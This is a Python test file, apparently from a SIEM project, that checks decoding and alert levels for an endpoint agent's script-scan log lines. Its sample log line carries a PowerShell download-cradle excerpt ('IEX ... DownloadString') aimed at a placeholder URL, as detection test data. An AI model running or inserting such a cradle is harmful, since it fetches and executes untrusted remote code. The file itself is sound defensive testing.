# tests/worker/test_script_scan.py
"""The agent's script_scan lines (agent/internal/scriptscan) decode and raise
the alert for their action and severity."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest

from worker.decoder_engine import DecoderEngine
from worker.sigma_engine import SigmaEngine

ROOT = os.path.join(os.path.dirname(__file__), "../..")
SHA = "ab" * 32


def _load(pattern):
    return [open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, pattern)))]


@pytest.fixture(scope="module")
def decoders():
    import yaml
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(_load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    return dec


@pytest.fixture(scope="module")
def rules():
    sig = SigmaEngine()
    sig.load_from_yaml_list(_load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return sig


def line(action, severity, extra=""):
    # As scriptscan.Line formats it.
    return (f'event=script_scan action={action} severity={severity} app="PowerShell_C:\\\\Windows\\\\x.exe_10.0" '
            f'image="C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe" pid=4242 sha256={SHA} '
            f'rules="builtin/scripts_loaders/ADSIEM_Script_PowerShell_Download_Cradle" '
            f'excerpt="IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"{extra}')


def test_decodes(decoders):
    ev, name = decoders.decode_named("script_scan", line("detected", "high", ' name="C:\\\\x.ps1"'))
    assert name == "script_scan" and ev["script.action"] == "detected" and ev["script.severity"] == "high"
    assert ev["process.pid"] == "4242" and ev["file.hash.sha256"] == SHA and ev["script.name"] == "C:\\x.ps1"
    assert ev["script.rules"].endswith("Download_Cradle") and "DownloadString" in ev["script.excerpt"]
    assert ev["process.executable"].endswith("powershell.exe")


@pytest.mark.parametrize("action,severity,title,level", [
    ("detected", "critical", "Malicious Script Content", "critical"),
    ("detected", "high", "Malicious Script Content", "critical"),
    ("terminated", "high", "Malicious Script Stopped", "high"),
    ("detected", "medium", "Suspicious Script Content", "medium"),
])
def test_alerts(decoders, rules, action, severity, title, level):
    raw = line(action, severity)
    ev, _ = decoders.decode_named("script_scan", raw)
    flat = {**ev, "log_type": "script_scan", "raw_message": raw, "hostname": "h", "group_id": "default"}
    got = {(m["title"], m["level"]) for m in asyncio.run(rules.evaluate(flat))}
    assert got == {(title, level)}
